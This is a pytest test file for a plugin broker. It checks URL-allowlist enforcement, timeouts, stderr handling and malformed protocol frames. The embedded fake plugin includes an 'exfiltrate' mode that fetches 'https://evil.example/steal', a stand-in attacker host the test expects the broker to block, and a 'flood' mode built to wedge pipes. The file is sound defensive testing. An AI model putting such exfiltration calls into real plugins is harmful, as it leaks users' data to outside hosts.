import io
import textwrap
import time
from pathlib import Path

import pytest

from rom_hub.broker.host import PluginCallError, PluginProcess
from rom_hub.manifest import parse_manifest

MANIFEST = """
[plugin]
slug = "fake"
name = "Fake"
version = "0.1.0"
rpp_version = "1"

[capabilities]
search = "fake_plugin:Search"

[permissions]
network = ["allowed.example"]
romm_api = []
"""

PLUGIN_SRC = textwrap.dedent(
    '''
    import sys
    import time

    from rom_hub_sdk import SearchProvider, SearchResult


    class Search(SearchProvider):
        def search(self, query, platform, limit):
            mode = self.ctx.config.get("mode", "static")
            if mode == "boom":
                raise ValueError("plugin exploded")
            if mode == "hang":
                time.sleep(600)
            if mode == "flood":
                # Fire host-bound calls and never read the answers. The reply
                # pipe fills, the host blocks writing into it, and this side
                # then blocks on its own stdout. Neither moves.
                import json
                for i in range(500):
                    sys.stdout.write(json.dumps({
                        "kind": "call", "id": "p%d" % i, "method": "http.get",
                        "params": {"url": "https://allowed.example/x",
                                   "params": {}},
                    }) + "\\n")
                    sys.stdout.flush()
                time.sleep(600)
            if mode == "chatty":
                # An ordinary plugin with logging enabled, or a dependency
                # emitting DeprecationWarnings. ~400 KB, far past any OS
                # pipe buffer.
                for i in range(4000):
                    print("progress %d %s" % (i, "." * 80), file=sys.stderr)
                return [SearchResult(source_id="chatty", title="survived")]
            if mode == "fetch":
                resp = self.ctx.http.get("https://allowed.example/data")
                return [SearchResult(source_id="fetched", title=resp.text)]
            if mode == "exfiltrate":
                resp = self.ctx.http.get("https://evil.example/steal")
                return [SearchResult(source_id="leaked", title=resp.text)]
            return [SearchResult(source_id="a", title=f"result for {query}")]
    '''
)


class RecordingFetcher:
    def __init__(self):
        self.calls: list[str] = []

    def get(self, url: str, params: dict) -> tuple[int, str]:
        self.calls.append(url)
        return 200, "payload"


@pytest.fixture
def plugin_dir(tmp_path: Path) -> Path:
    (tmp_path / "fake_plugin.py").write_text(PLUGIN_SRC, encoding="utf-8")
    return tmp_path


def _proc(plugin_dir, fetcher, config=None, timeout=30.0):
    return PluginProcess(
        plugin_dir=plugin_dir,
        manifest=parse_manifest(MANIFEST),
        config=config or {},
        fetcher=fetcher,
        timeout=timeout,
        # These tests exercise broker mechanics (call/response, timeouts,
        # URL-allowlist enforcement), not sandbox policy, so opt out of the
        # fail-closed default rather than requiring a real sandbox here.
        allow_unsandboxed=True,
    )


def test_search_returns_validated_results(plugin_dir):
    with _proc(plugin_dir, RecordingFetcher()) as proc:
        results = proc.search("oregon", None, 10)
    assert len(results) == 1
    assert results[0].title == "result for oregon"
    assert results[0].plugin == "fake"


def test_allowed_fetch_reaches_the_fetcher(plugin_dir):
    fetcher = RecordingFetcher()
    with _proc(plugin_dir, fetcher, {"mode": "fetch"}) as proc:
        results = proc.search("q", None, 10)
    assert fetcher.calls == ["https://allowed.example/data"]
    assert results[0].title == "payload"


def test_disallowed_fetch_never_reaches_the_fetcher(plugin_dir):
    fetcher = RecordingFetcher()
    with _proc(plugin_dir, fetcher, {"mode": "exfiltrate"}) as proc:
        with pytest.raises(PluginCallError, match="evil.example"):
            proc.search("q", None, 10)
    assert fetcher.calls == []


def test_plugin_exception_becomes_plugin_call_error(plugin_dir):
    with _proc(plugin_dir, RecordingFetcher(), {"mode": "boom"}) as proc:
        with pytest.raises(PluginCallError, match="plugin exploded"):
            proc.search("q", None, 10)


def test_a_plugin_that_logs_heavily_to_stderr_still_returns_its_results(plugin_dir):
    """stderr must be drained continuously, not read on the failure path.

    The host blocks reading stdout while nobody reads stderr, so once the
    plugin fills the ~64 KB stderr pipe it can never answer, and the operator
    is told "timed out" -- which points the investigation nowhere near the
    cause. This hits well-behaved plugins, not attackers.
    """
    started = time.monotonic()
    with _proc(plugin_dir, RecordingFetcher(), {"mode": "chatty"}, timeout=8.0) as proc:
        results = proc.search("q", None, 10)
    assert results[0].title == "survived"
    assert time.monotonic() - started < 8


def test_stderr_survives_for_the_diagnostic_when_a_plugin_dies(plugin_dir):
    """Draining must not mean discarding: it is the only signal an author has."""
    (plugin_dir / "fake_plugin.py").write_text(
        textwrap.dedent(
            """
            import sys
            print("a distinctive last gasp", file=sys.stderr)
            sys.stderr.flush()
            raise SystemExit(3)
            """
        ),
        encoding="utf-8",
    )
    with pytest.raises(PluginCallError, match="a distinctive last gasp"):
        with _proc(plugin_dir, RecordingFetcher()) as proc:
            proc.search("q", None, 10)


def test_hung_plugin_times_out_and_is_killed(plugin_dir):
    started = time.monotonic()
    with _proc(plugin_dir, RecordingFetcher(), {"mode": "hang"}, timeout=2.0) as proc:
        with pytest.raises(PluginCallError, match="timed out"):
            proc.search("q", None, 10)
    # The watchdog must actually fire, not wait out the plugin's 600s sleep.
    assert time.monotonic() - started < 30


class BigBodyFetcher(RecordingFetcher):
    """Replies big enough to fill the plugin's stdin pipe within a call or two."""

    def get(self, url: str, params: dict) -> tuple[int, str]:
        self.calls.append(url)
        return 200, "x" * 65536


def test_a_plugin_that_never_reads_its_replies_fails_as_a_plugin_call_error(plugin_dir):
    """The watchdog unblocking a wedged write must not surface as an OSError.

    The kill is correct and does unblock the host, but BrokenPipeError is not
    PluginCallError, so the documented contract breaks at exactly the moment
    it matters most.
    """
    fetcher = BigBodyFetcher()
    started = time.monotonic()
    with _proc(plugin_dir, fetcher, {"mode": "flood"}, timeout=5.0) as proc:
        with pytest.raises(PluginCallError, match="timed out"):
            proc.search("q", None, 10)
    assert time.monotonic() - started < 30


class DeadStdin(io.StringIO):
    def write(self, s):
        raise BrokenPipeError(32, "Broken pipe")


def test_a_broken_stdin_on_the_outbound_call_is_a_plugin_call_error(plugin_dir):
    proc = _proc(plugin_dir, RecordingFetcher())
    proc._proc = ScriptedProc("")
    proc._proc.stdin = DeadStdin()
    with pytest.raises(PluginCallError):
        proc._call("search", {})


class ScriptedProc:
    """A stand-in for Popen that replays frames a hostile plugin could emit.

    A real plugin's stdout is arbitrary code's stdout, so these are not
    theoretical shapes -- they are one `print` away.
    """

    def __init__(self, script: str):
        self.stdin = io.StringIO()
        self.stdout = io.StringIO(script)
        self.stderr = None
        self.killed = False

    def kill(self) -> None:
        self.killed = True

    def poll(self):
        return 0

    def wait(self, timeout=None):
        return 0


MALFORMED_FRAMES = [
    ("call_without_id", '{"kind":"call","method":"http.get","params":{"url":"https://allowed.example/x"}}'),
    ("error_not_an_object", '{"kind":"error","id":"h1","error":"boom"}'),
    ("error_without_message", '{"kind":"error","id":"h1","error":{}}'),
    ("result_without_result", '{"kind":"result","id":"h1"}'),
]


@pytest.mark.parametrize(
    "name,frame", MALFORMED_FRAMES, ids=[n for n, _ in MALFORMED_FRAMES]
)
def test_a_malformed_plugin_frame_is_a_plugin_call_error(plugin_dir, name, frame):
    """PluginCallError is the documented contract of every PluginProcess call.

    The dispatcher's blanket `except Exception` masks a leak today, but it
    reports it as `KeyError: 'result'`, which reads like a Hub bug and gets
    triaged as one -- and any direct consumer catching PluginCallError per the
    contract crashes outright.
    """
    proc = _proc(plugin_dir, RecordingFetcher())
    proc._proc = ScriptedProc(frame + "\n")
    with pytest.raises(PluginCallError):
        proc._call("search", {})


def test_a_timed_out_process_refuses_the_next_call_cleanly(plugin_dir):
    """A killed process must not be re-entered as though it were alive.

    The dispatcher builds one process per search today, so the blast radius is
    contained -- but reusing a process across two capability calls is the
    obvious Phase 2 optimisation, since spawning an interpreter per call is
    expensive.
    """
    with _proc(plugin_dir, RecordingFetcher(), {"mode": "hang"}, timeout=2.0) as proc:
        with pytest.raises(PluginCallError, match="timed out"):
            proc.search("q", None, 10)
        with pytest.raises(PluginCallError, match="not running"):
            proc.search("q", None, 10)


def test_a_stale_timeout_verdict_does_not_relabel_the_next_failure(plugin_dir):
    """_timed_out was set and never cleared, so it coloured everything after.

    Any later protocol error then masquerades as a timeout, sending the
    investigation after a deadline that never expired.
    """
    proc = _proc(plugin_dir, RecordingFetcher())
    proc._proc = ScriptedProc("{not json}\n")
    proc._timed_out = True  # residue from an earlier call's deadline
    with pytest.raises(PluginCallError, match="invalid JSON"):
        proc._call("search", {})
